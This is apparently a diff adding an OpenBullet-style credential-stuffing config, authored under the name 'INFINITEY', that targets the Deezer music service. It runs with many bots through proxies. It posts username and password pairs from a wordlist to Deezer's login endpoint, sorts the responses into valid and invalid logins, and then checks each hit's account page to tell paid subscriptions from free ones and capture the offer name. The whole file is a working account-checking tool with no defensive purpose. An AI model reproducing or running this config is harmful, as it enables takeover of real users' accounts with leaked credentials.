@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "Deezer",
+  "SuggestedBots": 150,
+  "LastModified": "2019-04-19T22:17:36.3629519+02:00",
+  "AdditionalInfo": "",
+  "Author": "INFINITEY",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET REQUEST GET "https://www.deezer.com/login?redirect_type=page&redirect_link=%2Fen%2F" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+#POST REQUEST POST "https://www.deezer.com/ajax/action.php" 
+  CONTENT "type=login&mail=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "referer: https://www.deezer.com/login?redirect_type=page&redirect_link=%2Fen%2F" 
+#CHECK KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "error" 
+  KEYCHAIN Success OR 
+    KEY "success" 
+#GET_ACC_INFO REQUEST GET "http://www.deezer.com/account/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "referer: http://www.deezer.com/en/" 
+#FREE_CHECK KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"MANAGE_SUBSCRIPTION\":true" 
+  KEYCHAIN Failure OR 
+    KEY "\"MANAGE_SUBSCRIPTION\":false" 
+    KEY "\"OFFER_NAME\":\"free\"" 
+#CAPTURE_OFFER PARSE "<SOURCE>" LR "\"OFFER_NAME\":\"" "\"" -> CAP "OFFER" 
